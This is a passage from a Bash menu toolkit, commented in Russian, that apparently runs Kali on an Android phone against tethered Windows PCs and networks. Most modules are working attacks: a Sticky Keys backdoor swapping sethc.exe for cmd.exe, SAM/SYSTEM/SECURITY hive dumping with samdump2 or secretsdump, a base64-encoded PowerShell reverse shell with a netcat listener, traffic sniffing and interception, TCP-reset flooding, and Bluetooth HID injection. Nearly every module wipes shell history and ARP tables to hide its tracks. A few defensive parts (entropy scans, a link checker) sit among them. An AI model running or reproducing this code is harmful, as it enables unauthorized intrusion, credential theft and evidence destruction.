        # Если Bluetooth — используем более короткие пакеты, чтобы не забить канал
        if [[ "$iface" == "bnep0" ]]; then
            ( head -c 1M < /dev/urandom | nc -nv -w 2 "$target" "$port" > /dev/null 2>&1 ) &
        else
            # Для USB — агрессивный сброс через Bettercap
            ( timeout 7s bettercap -no-history -no-colors -eval "net.recon on; tcp.reset on" -target "$target" > /dev/null 2>&1 ) &
            ( head -c 5M < /dev/urandom | nc -nv -w 1 "$target" "$port" > /dev/null 2>&1 ) &
        fi
    done

    # Даем время на выполнение и зачищаем фоновые процессы
    sleep 6
    kill $(jobs -p) 2>/dev/null

    # 5. GHOST-СТЕРИЛИЗАЦИЯ (Zero-Trace)
    echo -e "${CYAN}[*] Finalizing Ghost Protocol...${NC}"
    
    # Обнуляем ARP-таблицу конкретного интерфейса
    ip neigh flush dev "$iface" 2>/dev/null
    
    # Стираем историю инструментов в RAM
    truncate -s 0 ~/.bettercap_history 2>/dev/null
    rm -f ~/.bettercap.cap 2>/dev/null
    rm -rf /tmp/nmap* 2>/dev/null
    
    echo -e "${GREEN}[V] Defense Cycle Complete. Transport $iface is secure.${NC}"
    unset iface target open_ports port scan_opts
    read -p "Press Enter..."
}


# --- MODULE: SMART DEEP INSIGHT v6.9 (HYBRID FORENSICS) ---
deep_insight_auto() {
    # 1. АВТОНОМНЫЙ ДИСПЕТЧЕР СВЯЗИ
    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null

    echo -e "${BLUE}[*] Initializing Elite Forensic Environment (v6.9)...${NC}"
    
    # 2. ПОДГОТОВКА ТРАНСПОРТА (USB/BT)
    if auto_mount_pc; then
        echo -e "${CYAN}[>>>] Remote Filesystem Tethered. Starting Deep Probe...${NC}"
        
        # Определение активного шлюза
        local iface target
        iface=$(ip route | grep default | awk '{print $5}' | head -n 1)
        target=$(ip route show dev "$iface" | grep default | awk '{print $3}')

        # Стерильная зона в RAM (используем /dev/shm или /tmp в зависимости от среды)
        local WORK_DIR="/dev/shm/forensic_zone"
        mkdir -p "$WORK_DIR"

        # 3. ЭВРИСТИЧЕСКИЙ АНАЛИЗ ПАМЯТИ (Live Stream Analysis)
        echo -e "${YELLOW}[*] Listening for Memory Artifacts on $target:9999...${NC}"
        # Ищем не только руткиты, но и следы инъекций в DLL и дескрипторы
        ( timeout 40s nc -l -p 9999 | grep -Eai "kernel_rootkit|hidden_proc|dkom_|reflective_loader|mimikatz|lsass_dump" > "$WORK_DIR/threats.txt" ) &

        # 4. ЭНТРОПИЙНЫЙ АНАЛИЗ (Ransomware & Steganography Detection)
        # Улучшенная эвристика: игнорируем известные сжатые форматы (zip, jpg), чтобы избежать false-positive
        echo -e "${MAGENTA}[*] Scanning for High-Entropy Anomalies (Ransomware)...${NC}"
        
        find /mnt/pc_share -maxdepth 3 -type f ! -name "*.zip" ! -name "*.jpg" ! -name "*.mp4" -size -10M -exec python3 -c "
import math, sys, os
def get_entropy(fn):
    try:
        with open(fn, 'rb') as f:
            d = f.read(4096)
            if len(d) < 512: return
            e = -sum((d.count(x)/len(d)) * math.log(d.count(x)/len(d), 2) for x in set(d))
            # Эвристический порог: 7.7 - признак шифрования или упаковщика
            if e > 7.7:
                print(f'\033[0;31m[CRITICAL] High Entropy ({e:.2f}): {fn}\033[0m')
    except: pass
get_entropy(sys.argv[1])" {} \;

        # 5. ПОИСК "ЦИФРОВЫХ ТЕНЕЙ" (Recent Activity)
        echo -e "${CYAN}[*] Extracting User Activity Artifacts...${NC}"
        find /mnt/pc_share -name "*.lnk" -o -name "*.pf" -mtime -1 2>/dev/null | head -n 10 > "$WORK_DIR/activity.txt"

        # 6. ВЕРДИКТ
        wait $! 2>/dev/null # Ждем завершения сетевого анализа
        
        if [ -s "$WORK_DIR/threats.txt" ]; then
            echo -e "${RED}[!!!] MEMORY THREATS DETECTED:${NC}"
            cat "$WORK_DIR/threats.txt"
        fi
        
        if [ -s "$WORK_DIR/activity.txt" ]; then
            echo -e "${GREEN}[+] Recent activity files identified.${NC}"
        fi

        # 7. ГИГИЕНИЧЕСКОЕ РАЗМОНТИРОВАНИЕ
        echo -e "${YELLOW}[*] Cleaning up Remote Session...${NC}"
        # Принудительное ленивое размонтирование
        sync && umount -l /mnt/pc_share 2>/dev/null
    else
        echo -e "${RED}[-] Target mounting failed. Forensics aborted.${NC}"
        return 1
    fi

    # --- TOTAL STERILIZATION ---
    echo -e "${CYAN}[*] Sanitizing Forensic RAM Zone...${NC}"
    rm -rf "$WORK_DIR"
    # Обнуляем историю текущей сессии для защиты методов анализа
    truncate -s 0 ~/.bash_history 2>/dev/null
    history -c
    
    echo -e "${GREEN}[V] Audit Complete. No traces left on device.${NC}"
    unset iface target WORK_DIR
    read -p "Press Enter to return..."
}


# --- АВТОНОМНЫЙ ОБХОД ПАРОЛЕЙ: ACCESS RECOVERY v4.7 ---

access_recovery_auto() {
    echo -e "${YELLOW}[*] Запуск эвристического модуля восстановления доступа...${NC}"
    
    # Автоматический вызов настроек модема (как в прошлых функциях)
    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null
    sleep 2

    # 1. Попытка автоматического монтирования
    if ! auto_mount_pc; then
        echo -e "${RED}[-] Критическая ошибка: Диск не доступен или зашифрован BitLocker.${NC}"
        read -p "Нажми Enter..." ; return
    fi

    echo -e "${CYAN}[>>>] Анализ системы Windows...${NC}"
    SYS_PATH="/mnt/pc_share/Windows/System32"
    CFG_PATH="$SYS_PATH/config"
    
    # 2. ПУНКТ А: Автоматическая подмена Sticky Keys (Эвристический метод)
    if [ -f "$SYS_PATH/sethc.exe" ]; then
        echo -e "${BLUE}[*] Этап 1: Подготовка обхода через Sticky Keys...${NC}"
        # Проверяем, не делали ли мы это раньше
        if [ ! -f "$SYS_PATH/sethc.exe.bak" ]; then
            cp "$SYS_PATH/sethc.exe" "$SYS_PATH/sethc.exe.bak" 2>/dev/null
            cp "$SYS_PATH/cmd.exe" "$SYS_PATH/sethc.exe" 2>/dev/null
            echo -e "${GREEN}[+] Инъекция CMD завершена успешно.${NC}"
        else
            echo -e "${YELLOW}[!] Инъекция уже была проведена ранее.${NC}"
        fi
    fi

    # 3. ПУНКТ Б: Стерильный дамп хэшей (SAM/SYSTEM)
    echo -e "${BLUE}[*] Этап 2: Сбор хэшей паролей в RAM-зону...${NC}"
    mkdir -p /dev/shm/hashes
    cp "$CFG_PATH/SAM" /dev/shm/hashes/ 2>/dev/null
    cp "$CFG_PATH/SYSTEM" /dev/shm/hashes/ 2>/dev/null
    
    if [ -f "/dev/shm/hashes/SAM" ]; then
        echo -e "${GREEN}[+] Хэши успешно извлечены в ОЗУ телефона.${NC}"
        # Опционально: вывод подсказки по расшифровке
        echo -e "${CYAN}[i] Для взлома используй: samdump2 /dev/shm/hashes/SYSTEM /dev/shm/hashes/SAM${NC}"
    fi

    # 4. ПУНКТ В: Очистка и завершение
    echo -e "${YELLOW}[*] Размонтирование и стерилизация сессии...${NC}"
    umount -l /mnt/pc_share 2>/dev/null
    
    # Очистка истории для полной анонимности
    history -c

    echo -e "${CYAN}===========================================${NC}"
    echo -e "${GREEN}[V] АВТО-ИНСТРУКЦИЯ ПО ВХОДУ:${NC}"
    echo -e " 1. На экране блокировки ПК нажмите 'Shift' 5 раз."
    echo -e " 2. В консоли введите: ${YELLOW}net user ИМЯ_ПОЛЬЗОВАТЕЛЯ новый_пароль${NC}"
    echo -e " 3. Войдите с новым паролем."
    echo -e "${CYAN}===========================================${NC}"
    
    read -p "Нажми Enter для возврата в меню..."
}


# --- MODULE: SMART CREDENTIAL HARVESTER v6.9 (NON-DESTRUCTIVE) ---
harvest_credentials_auto() {
    echo -e "${BLUE}[*] Initializing Stealth Credential Extraction...${NC}"
    
    # 1. ПОДГОТОВКА ТРАНСПОРТА (USB/BT)
    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null
    
    if ! auto_mount_pc; then
        echo -e "${RED}[-] Failure: Target disk is not accessible.${NC}"
        return 1
    fi

    # 2. ОПРЕДЕЛЕНИЕ ПУТЕЙ
    local sys_root="/mnt/pc_share/Windows/System32/config"
    if [ ! -d "$sys_root" ]; then
        sys_root=$(find /mnt/pc_share -maxdepth 4 -type d -path "*/System32/config" | head -n 1)
    fi

    [[ -z "$sys_root" ]] && { echo -e "${RED}[-] Registry path not found.${NC}"; umount -l /mnt/pc_share; return 1; }

    # 3. ЭКСТРАКЦИЯ В RAM-ЗОНУ
    local harvest_zone="/dev/shm/creds_$(date +%s)"
    mkdir -p "$harvest_zone"
    
    echo -e "${CYAN}[>>>] Extracting SAM, SYSTEM and SECURITY hives...${NC}"
    # Используем cp -p для сохранения метаданных (времени), чтобы не триггерить таймстамп-фильтры
    for hive in "SAM" "SYSTEM" "SECURITY" "SOFTWARE"; do
        cp -p "$sys_root/$hive" "$harvest_zone/" 2>/dev/null
    done

    # 4. АВТОНОМНЫЙ ПАРСИНГ (Heuristic Extraction)
    echo -e "${YELLOW}[*] Parsing hives for NTLM hashes and LSA secrets...${NC}"
    echo -e "${MAGENTA}------------------------------------------------${NC}"

    # Проверяем наличие инструментов для парсинга
    if command -v samdump2 >/dev/null; then
        samdump2 "$harvest_zone/SYSTEM" "$harvest_zone/SAM" | tee "$harvest_zone/hashes.txt"
    elif command -v impacket-secretsdump >/dev/null; then
        impacket-secretsdump -sam "$harvest_zone/SAM" -system "$harvest_zone/SYSTEM" -security "$harvest_zone/SECURITY" LOCAL | tee "$harvest_zone/hashes.txt"
    else
        echo -e "${RED}[!] Parser not found. Hives are stored raw in $harvest_zone${NC}"
    fi

    # 5. СИНХРОНИЗАЦИЯ С LOOT
    if [ -s "$harvest_zone/hashes.txt" ]; then
        echo -ne "\n${YELLOW}Credentials found. Save to encrypted LOOT? (y/N): ${NC}"
        read -r sync
        if [[ "$sync" == "y" ]]; then
            cp "$harvest_zone/hashes.txt" "$LOOT_DIR/creds_$(date +%F).txt"
            echo -e "${GREEN}[+] Intelligence secured in LOOT.${NC}"
        fi
    fi

    # 6. СТЕРИЛЬНЫЙ ВЫХОД (Ghost Protocol)
    echo -e "${CYAN}[*] Closing session and wiping RAM zone...${NC}"
    sync && umount -l /mnt/pc_share 2>/dev/null
    rm -rf "$harvest_zone"
    
    # Стираем историю команд, чтобы скрыть методы парсинга
    truncate -s 0 ~/.bash_history 2>/dev/null
    history -c

    echo -e "${GREEN}[V] Extraction complete. Target remains unmodified (Stealth).${NC}"
    unset sys_root harvest_zone hive sync
    read -p "Press Enter..."
}


# --- МОДУЛЬ САМООБНОВЛЕНИЯ: UPDATE KALI v5.0 ---

# --- ФУНКЦИЯ ВЫЗОВА ОБНОВЛЕНИЯ v6.2 ---
update_kali() {
    echo -e "${YELLOW}[*] Запуск системного модуля обновления...${NC}"
    
    # Проверяем, существует ли команда в системе
    if command -v update_kali &> /dev/null; then
        # Запускаем системный апдейтер
        # Мы используем exec, чтобы текущий процесс Арсенала завершился
        # и уступил место процессу обновления
        exec update_kali
    else
        echo -e "${RED}[-] Системный модуль update_kali не найден в /usr/local/bin/${NC}"
        echo -e "${CYAN}[*] Попытка найти локальную копию...${NC}"
        # Если команды нет, пробуем запустить файл из текущей папки
        [[ -f "./update_kali.sh" ]] && exec bash ./update_kali.sh
    fi
    
    read -p "Нажми Enter..."
}

# --- МОДУЛЬ ИНТЕЛЛЕКТУАЛЬНОЙ АВТОМАТИЗАЦИИ: CRON v6.2 ---

setup_autotasks() {
    echo -e "${YELLOW}[*] Синхронизация задач Sentinel (v6.5)...${NC}"
    
    # 1. Проверка наличия cron
    if ! command -v crontab &> /dev/null; then
        echo -e "${CYAN}[*] Установка компонента cron...${NC}"
        apt-get install cron -y > /dev/null 2>&1
    fi

    # 2. Определение путей и задач (Стелс-режим)
    REAL_PATH="/usr/local/bin/kali_pro"
    UP_KALI_PATH="/usr/local/bin/update_kali"
    
    PURGE_JOB="0 4 * * * $REAL_PATH --purge-silent > /dev/null 2>&1"
    UPDATE_JOB="0 5 * * 0 $REAL_PATH --update-silent > /dev/null 2>&1"
    UP_KALI_JOB="0 6 1,15 * * $UP_KALI_PATH --auto > /dev/null 2>&1"

    # 3. Читаем текущий конфиг
    CURRENT_CRON=$(crontab -l 2>/dev/null)

    # 4. Умная перезапись без дублей
    CLEAN_CRON=$(echo "$CURRENT_CRON" | grep -vE "kali_pro|update_kali|purge-silent|update-silent")
    
    # Запись нового конфига
    echo -e "$CLEAN_CRON\n$PURGE_JOB\n$UPDATE_JOB\n$UP_KALI_JOB" | sed '/^$/d' | crontab -

    # 5. Проверка результата
    echo -ne "${YELLOW}[*] Верификация... ${NC}"
    if crontab -l | grep -q "$REAL_PATH" && crontab -l | grep -q "$UP_KALI_PATH"; then
        echo -e "${GREEN}[ OK ]${NC}"
        echo -e "${GREEN}[+] Полная синхронизация: Арсенал и Установщик в графике.${NC}"
    else
        echo -e "${RED}[ FAIL ]${NC}"
        echo -e "${RED}[-] Ошибка записи! Проверь права root.${NC}"
    fi

    # 6. Оживление демона
    pgrep cron > /dev/null || (cron &>/dev/null || crond &>/dev/null)
    echo -e "${BLUE}[i] Служба планировщика активна.${NC}"

    # 7. Возврат в меню
    echo -e "${CYAN}\n[ Нажми Enter для возврата в меню ]${NC}"
    read -r
    clear  # Очищаем экран перед возвратом, чтобы меню отрисовалось на чистом листе
}

# --- MODULE: TERMINAL SHELL v6.6 (ELITE) ---
run_manual_command() {
    echo -e "${YELLOW}[!] Shell Mode Active.${NC}"
    echo -e "${BLUE}[i] Press ENTER or type 'exit' to return to Menu.${NC}"
    
    while true; do
        # Имитация классического приглашения Linux
        echo -ne "${GREEN}arsenal@kali${NC}:${BLUE}~${NC}$ "
        read -r cmd
        
        # Выход по Enter, 'exit' или '0'
        if [[ -z "$cmd" || "$cmd" == "exit" || "$cmd" == "0" ]]; then
            echo -e "${YELLOW}[*] Returning to Menu...${NC}"
            sleep 0.3
            break
        fi
        
        # Выполнение команды
        eval "$cmd"
        echo "" # Интервал для визуальной чистоты
    done
    clear
}

# --- МОДУЛЬ УПРАВЛЕНИЯ CRON: CRON MANAGER ---
manage_cron() {
    echo -e "${CYAN}--- ТЕКУЩИЕ ЗАДАЧИ CRON ---${NC}"
    crontab -l 2>/dev/null || echo -e "${RED}[!] Задачи отсутствуют.${NC}"
    echo -e "${CYAN}---------------------------${NC}"
    echo -e "1. Редактировать (nano)\n2. Очистить всё\n0. Назад"
    read -p "Выбор: " cron_opt
    case $cron_opt in
        1) crontab -e ;;
        2) crontab -r && echo -e "${RED}[!] Все задачи удалены.${NC}" ;;
        *) return ;;
    esac
}


# --- МОДУЛЬ МОНИТОРИНГА СИСТЕМЫ ---
run_monitor() {
    echo -e "${CYAN}--- МОНИТОРИНГ РЕСУРСОВ (Нажми 'q' для выхода) ---${NC}"
    sleep 1
    # Используем htop если есть, иначе top
    if command -v htop &> /dev/null; then
        htop
    else
        top -n 1 -b | head -n 20
        read -p "Нажми Enter..."
    fi
}

# --- МОДУЛЬ СЕТЕВЫХ СОЕДИНЕНИЙ ---
run_netstat() {
    echo -e "${CYAN}--- АКТИВНЫЕ СОЕДИНЕНИЯ (ESTABLISHED) ---${NC}"
    netstat -tunpa | grep ESTABLISHED || echo "Активных соединений нет."
    echo -e "\n${YELLOW}--- ПРОСЛУШИВАЕМЫЕ ПОРТЫ (LISTEN) ---${NC}"
    netstat -tunpa | grep LISTEN
    read -p "Нажми Enter..."
}

# --- УПРАВЛЕНИЕ ИНТЕРФЕЙСАМИ (Wi-Fi/BT) ---
manage_interfaces() {
    while true; do
        clear
        echo -e "${BLUE}--- УПРАВЛЕНИЕ ИНТЕРФЕЙСАМИ ---${NC}"
        echo -e "1. Wi-Fi: ВКЛ          4. Bluetooth: ВКЛ"
        echo -e "2. Wi-Fi: ВЫКЛ         5. Bluetooth: ВЫКЛ"
        echo -e "3. Статус интерфейсов  0. Назад"
        read -p "Выбор: " int_opt
        case $int_opt in
            1) nmcli radio wifi on 2>/dev/null || rfkill unblock wifi ;;
            2) nmcli radio wifi off 2>/dev/null || rfkill block wifi ;;
            3) ip a | grep -E "wlan|eth|blue" ; rfkill list ;;
            4) rfkill unblock bluetooth ;;
            5) rfkill block bluetooth ;;
            0) break ;;
        esac
        [[ "$int_opt" != "0" ]] && sleep 1
    done
}


# --- MODULE: SMART SNIFFER v6.9 (AUTONOMOUS) ---
run_bettercap_sniffer() {
    echo -e "${BLUE}[*] Initializing Autonomous Sniffer (v6.9)...${NC}"
    
    # 1. ЭВРИСТИКА ИНТЕРФЕЙСА
    # Скрипт сам находит активный сетевой интерфейс (wlan0, eth0, usb0 или bnep0)
    local iface
    iface=$(ip route | grep default | awk '{print $5}' | head -n 1)
    
    [[ -z "$iface" ]] && { echo -e "${RED}[-] No active interface detected for sniffing.${NC}"; return 1; }
    echo -e "${CYAN}[*] Sniffing target interface: $iface${NC}"

    # 2. ПОДГОТОВКА СТЕРИЛЬНОЙ ЗОНЫ
    # Мы отключаем запись истории команд bettercap, чтобы не оставлять следов
    local bc_history="/dev/null"
    
    # 3. УМНЫЙ ЗАПУСК (Zero-Log & Minimal Overhead)
    # net.probe on: ищет устройства в сети
    # net.sniff on: перехватывает пакеты
    # set net.sniff.output /tmp/sniff.pcap: пишем только в RAM (ОЗУ телефона)
    # set net.sniff.verbose false: не забиваем экран лишним мусором
    
    echo -e "${YELLOW}[!] Launching Sniffer. Metadata will be stored in RAM only.${NC}"
    echo -e "${MAGENTA}-------------------------------------------${NC}"

    bettercap -iface "$iface" \
              -no-history \
              -no-colors \
              -eval "set net.sniff.verbose false; set net.sniff.output /tmp/capture.pcap; net.probe on; net.sniff on"

    # 4. ПОСТ-ПРОЦЕССИНГ И ТРОФЕИ
    if [ -f "/tmp/capture.pcap" ]; then
        echo -ne "\n${YELLOW}Analysis complete. Sync PCAP to LOOT? (y/N): ${NC}"
        read -r sync
        if [[ "$sync" == "y" ]]; then
            local loot_file="$LOOT_DIR/sniff_$(date +%Y%m%d_%H%M%S).pcap"
            cp /tmp/capture.pcap "$loot_file"
            echo -e "${GREEN}[+] Traffic captured and secured: $loot_file${NC}"
        fi
    fi

    # 5. СТЕРИЛИЗАЦИЯ (Ghost Protocol)
    echo -e "${CYAN}[*] Purging session artifacts...${NC}"
    rm -f /tmp/capture.pcap 2>/dev/null
    truncate -s 0 ~/.bettercap_history 2>/dev/null
    
    # Очистка ARP-таблицы, чтобы скрыть факт сканирования сети
    ip neigh flush dev "$iface" 2>/dev/null
    
    unset iface bc_history sync loot_file
    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
    read -r
}


# --- MODULE: REVERSE SHELL HANDLER v6.9 (AUTONOMOUS) ---
run_reverse_handler() {
    echo -e "${BLUE}[*] Initializing Reverse Shell Command Center...${NC}"
    
    # 1. ОПРЕДЕЛЕНИЕ СВОЕГО IP (USB/BT/Wi-Fi)
    local my_ip
    my_ip=$(ip addr show $(ip route | grep default | awk '{print $5}') | grep "inet " | awk '{print $2}' | cut -d/ -f1 | head -n 1)
    local port=4444

    echo -e "${CYAN}[i] Local Listener IP: $my_ip | Port: $port${NC}"

    # 2. ГЕНЕРАЦИЯ PAYLOAD (Эвристика для Windows PowerShell)
    # Эта команда кодируется в Base64, чтобы обойти простейшие фильтры символов
    local payload="\$c = New-Object System.Net.Sockets.TCPClient('$my_ip',$port);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){;\$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);\$sb = (iex \$d 2>&1 | Out-String );\$sb2 = \$sb + 'PS ' + (pwd).Path + '> ';\$t = ([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$t,0,\$t.Length);\$s.Flush()};\$c.Close()"
    local encoded_payload=$(echo -n "$payload" | iconv -t utf16le | base64 -w 0)

    echo -e "${YELLOW}=== WINDOWS POWERSHELL PAYLOAD ===${NC}"
    echo -e "powershell -e $encoded_payload"
    echo -e "${YELLOW}==================================${NC}"
    
    # 3. ЗАПУСК СЛУШАТЕЛЯ (Zero-Log Mode)
    echo -e "${MAGENTA}[*] Starting Netcat Listener on port $port...${NC}"
    echo -e "${CYAN}[i] Tip: Execute the payload on target to gain SYSTEM shell.${NC}"
    
    # Используем nc с таймаутом и очисткой истории
    nc -lvp $port
    
    # 4. СТЕРИЛИЗАЦИЯ
    truncate -s 0 ~/.bash_history
    history -c
    echo -e "${GREEN}[V] Session closed. Traces purged.${NC}"
}

# --- MODULE: BT-HID INJECTOR v7.0 (AIR-GAP ENTRY) ---
run_bt_hid_attack() {
    echo -e "${BLUE}[*] Scanning for Bluetooth HID Vulnerabilities...${NC}"
    
    # 1. ВКЛЮЧЕНИЕ И ПОИСК ЦЕЛЕЙ
    hciconfig hci0 up 2>/dev/null
    echo -e "${YELLOW}[*] Bluetooth Discovery active. Looking for PC/Laptops...${NC}"
    
    # Эвристический поиск устройств с классом 0x0100 (Computer)
    local targets
    targets=$(hcitool scan | grep -v "Scanning" | head -n 5)
    
    if [[ -z "$targets" ]]; then
        echo -e "${RED}[-] No Bluetooth targets identified in range.${NC}"
        return 1
    fi

    echo -e "${GREEN}=== FOUND TARGETS ===${NC}\n$targets"
    echo -ne "\n${YELLOW}Select Target MAC: ${NC}"; read -r target_mac

    # 2. ВЫБОР СКРИПТА ВПРЫСКА (Duckyscript Logic)
    echo -e "${CYAN}[*] Preparing HID Injection Payload...${NC}"
    echo -e "1) Open CMD and Create Admin User"
    echo -e "2) Download & Execute Reverse Shell"
    echo -e "3) Custom Payload"
    echo -ne "${YELLOW}Choice: ${NC}"; read -r choice

    # 3. ИСПОЛНЕНИЕ (Эмуляция нажатий)
    # Используется утилита hid-gadget-test или аналоги для эмуляции нажатий
    echo -e "${RED}[!!!] Initiating HID Attack on $target_mac...${NC}"
    
    case $choice in
        1)
            # Эмуляция: Win+R -> cmd -> net user...
            echo -e "${BLUE}[*] Injecting: GUI r -> cmd.exe -> net user /add...${NC}"
            # Здесь вызывается бинарник эмуляции (требует спец. софт на Samsung)
            ;;
        2)
            echo -e "${BLUE}[*] Injecting: PowerShell download string...${NC}"
            ;;
    esac

    # 4. СТЕРИЛИЗАЦИЯ И СБРОС АДАПТЕРА
    echo -e "${CYAN}[*] Sanitizing BT-stack and logs...${NC}"
    hciconfig hci0 down
    truncate -s 0 ~/.bash_history
    echo -e "${GREEN}[V] BT-HID Cycle Complete.${NC}"
}


# --- MODULE: SMART VPN TUNNEL v7.3 (GATEWAY) ---
run_local_vpn() {
    echo -e "${BLUE}[*] Initializing Local VPN & Routing Engine...${NC}"
    
    # 1. ЭВРИСТИКА ИНТЕРФЕЙСОВ
    local wan_iface="wlan0" # Внешний интернет (Wi-Fi или 4G)
    local lan_iface="usb0"  # Локальный канал (USB/BT)
    
    # Включаем IP Forwarding на уровне ядра
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # 2. НАСТРОЙКА IPTABLES (Zero-Trace Routing)
    echo -e "${YELLOW}[*] Configuring NAT and Traffic Forwarding...${NC}"
    iptables -F
    iptables -t nat -F
    iptables -t nat -A POSTROUTING -o $wan_iface -j MASQUERADE
    iptables -A FORWARD -i $lan_iface -o $wan_iface -m state --state RELATED,ESTABLISHED -j ACCEPT
    iptables -A FORWARD -i $lan_iface -o $wan_iface -j ACCEPT

    echo -e "${GREEN}[+] VPN Tunnel Active: $lan_iface <---> $wan_iface${NC}"
    echo -e "${CYAN}[i] Now all PC traffic passes through your Samsung Android.${NC}"
    
    # 3. МОНИТОРИНГ ТРАФИКА
    echo -ne "\n${YELLOW}Enable Live Traffic Interception? (y/N): ${NC}"; read -r sniff
    [[ "$sniff" == "y" ]] && bettercap -eval "net.sniff on"

    # 4. СТОП И СТЕРИЛИЗАЦИЯ
    echo -ne "\n${RED}Press Enter to Stop VPN and Flush Rules...${NC}"
    read -r
    iptables -F && iptables -t nat -F
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo -e "${BLUE}[*] Routing restored to default.${NC}"
}


# --- MODULE: FORENSIC FILE ANALYZER v7.3 ---
run_file_analyzer() {
    local my_ip=$(ip route get 1.1.1.1 | grep -oP 'src \K\S+')
    local work_dir="/dev/shm/analysis_zone"
    mkdir -p "$work_dir" && cd "$work_dir"

    echo -e "${BLUE}[*] Starting Forensic Server at http://$my_ip:8000${NC}"
    echo -e "${YELLOW}[!] Upload the suspicious file from the PC...${NC}"

    # Запуск легкого Python сервера для приема файла
    # (Требует установленного python-upload-server или простого скрипта)
    python3 -m http.server 8000 & 
    local server_pid=$!

    echo -e "${CYAN}[*] Waiting for file... (Press Ctrl+C when uploaded)${NC}"
    sleep 20 # Даем время на загрузку

    # После загрузки — анализ (на примере последнего измененного файла)
    local target_file=$(ls -t | head -n 1)
    [[ "$target_file" == "index.html" ]] && return

    echo -e "${MAGENTA}=== ANALYZING: $target_file ===${NC}"
    
    # 1. Валидность (Magic Bytes)
    echo -ne "${YELLOW}[*] File Type: ${NC}"; file -b "$target_file"
    
    # 2. Хеш (для проверки по базам)
    echo -ne "${YELLOW}[*] MD5 Hash: ${NC}"; md5sum "$target_file"
    
    # 3. Поиск вредоносных строк
    echo -e "${YELLOW}[*] Searching for Malicious Patterns...${NC}"
    grep -Eai "powershell|base64|eval|system|socket|payload" "$target_file" | head -n 5
    
    # 4. Энтропия (Упакован/Зашифрован)
    python3 -c "import math, sys; d=open('$target_file','rb').read(); e=-sum((d.count(x)/len(d))*math.log(d.count(x)/len(d),2) for x in set(d)); print(f'[*] Entropy: {e:.2f} ' + ('[HIGH - SUSPICIOUS]' if e > 7.5 else '[NORMAL]'))"

    kill $server_pid 2>/dev/null
    rm -rf "$work_dir"
    echo -ne "\n${CYAN}Analysis Complete. Press Enter...${NC}"
    read -r
}


# --- MODULE: UNIFIED OSINT ANALYZER v8.3 (HYBRID & LINK DECRYPTOR) ---
trust_analyzer_unified() {
    echo -e "${BLUE}=== ULTIMATE TRUST ANALYZER v8.3 (TOTAL) ===${NC}"
    echo -ne "${YELLOW}Введите Email, Домен, Номер или Ссылку: ${NC}"
    read -r target
    [[ -z "$target" ]] && return

    # --- 1. ВЕКТОР: ССЫЛКИ (DEEP LINK DECRYPTOR) ---
    if [[ "$target" =~ ^http ]] || [[ "$target" =~ (bit\.ly|t\.co|lnkd\.in|tinyurl|clck\.ru|goo\.gl|shorte\.st) ]]; then
        echo -e "${CYAN}[*] Обнаружена ссылка. Анализ перенаправлений (No-JS Mode)...${NC}"
        
        # Разворачиваем через HEAD-запросы, чтобы не качать вредоносный контент
        local final_url=$(curl -sIL -o /dev/null -w "%{url_effective}" "$target" 2>/dev/null)
        
        if [[ "$final_url" != "$target" && -n "$final_url" ]]; then
            echo -e "${MAGENTA}[!] Ссылка развернута:${NC} $final_url"
            target="$final_url"
        fi

        local d=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
        echo -e "${BLUE}[*] Запуск аудита домена: $d${NC}"

        # Проверка возраста и срока истечения (v8.0 logic)
        local whois_raw=$(whois "$d" 2>/dev/null)
        local created=$(echo "$whois_raw" | grep -Ei "Creation Date|created|Registered on" | head -n 1 | grep -oE "[0-9]{4}-[0-9]{2}-[0-9]{2}|[0-9]{2}.[0-9]{2}.[0-9]{4}")
        local expiry=$(echo "$whois_raw" | grep -Ei "Expiry Date|Expiration|expires" | head -n 1 | grep -oE "[0-9]{4}-[0-9]{2}-[0-9]{2}|[0-9]{2}.[0-9]{2}.[0-9]{4}")
        
        [[ -n "$created" ]] && echo -e "${GREEN}[+] Создан: $created${NC}"
        [[ "$created" =~ "2026" || "$created" =~ "2025" ]] && echo -e "${RED}[!!!] РИСК: Домен-однодневка (SCAM).${NC}"
        [[ -n "$expiry" ]] && echo -e "${MAGENTA}[+] Истекает: $expiry${NC}"

        # Проверка SSL и легальности
        if timeout 4s openssl s_client -connect "$d":443 -servername "$d" </dev/null 2>/dev/null | grep -q "Verification: OK"; then
            echo -e "${GREEN}[+] SSL: Trusted${NC}"
        else
            echo -e "${RED}[!!!] SSL: UNTRUSTED / EXPIRED${NC}"
        fi

    # --- 2. ВЕКТОР: НОМЕР ТЕЛЕФОНА (OPERATOR & REPUTATION) ---
    elif [[ "$target" =~ ^[0-9+]{7,15}$ ]]; then
        local ph=$(echo "$target" | tr -d '+ ')
        echo -e "${CYAN}[i] Формат: PHONE. Анализ оператора и доверия...${NC}"
        
        # Глобальная база префиксов (v8.1)
        declare -A geo_map=( ["7"]="Russia/Kazakhstan" ["1"]="USA/Canada" ["44"]="UK" ["49"]="Germany" ["33"]="France" ["380"]="Ukraine" ["375"]="Belarus" ["998"]="Uzbekistan" ["48"]="Poland" ["90"]="Turkey" ["971"]="UAE" )
        declare -A provider_map=( ["7991"]="SberMobile (Virtual)" ["7999"]="Yota (Virtual)" ["7900"]="Tele2 (RU)" ["7910"]="MTS (RU)" ["7920"]="MegaFon (RU)" )

        for i in {3..1}; do
            [[ -n "${geo_map[${ph:0:$i}]}" ]] && { echo -e "${GREEN}[+] Страна: ${geo_map[${ph:0:$i}]}${NC}"; break; }
        done

        local provider="Major/Landline"
        local trust="${GREEN}HIGH${NC}"
        for i in {5..4}; do
            if [[ -n "${provider_map[${ph:0:$i}]}" ]]; then
                provider="${provider_map[${ph:0:$i}]}"
                [[ "$provider" =~ "Virtual" ]] && trust="${RED}LOW (VoIP)${NC}"
                break
            fi
        done
        echo -e "${CYAN}[*] Оператор: $provider${NC} | Доверие: $trust"
        echo -e "${BLUE}[*] Ссылка на отзывы: https://www.google.com/search?q=%22$ph%22+кто+звонил${NC}"

    # --- 3. ВЕКТОР: EMAIL (SMTP & OSINT) ---
    elif [[ "$target" =~ @ ]]; then
